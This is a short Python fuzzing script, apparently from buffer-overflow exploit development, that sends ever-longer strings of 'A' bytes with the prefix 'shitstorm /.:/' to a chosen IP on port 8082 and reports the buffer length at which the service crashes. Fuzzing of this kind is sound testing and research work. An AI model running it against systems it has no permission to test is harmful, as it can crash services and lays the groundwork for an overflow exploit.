# #!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = b"A" * 100

IP_ADDRESS = input(f'Enter IP address: ')
PORT = 8082

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP_ADDRESS, PORT))
        payload = b'shitstorm /.:/' + buffer
        sock.send(payload)
        sock.close()
        sleep(1)
        buffer += b"A" * 100
    except:
        print("Fuzzing crash at %s bytes" % str(len(buffer)))
        sys.exit()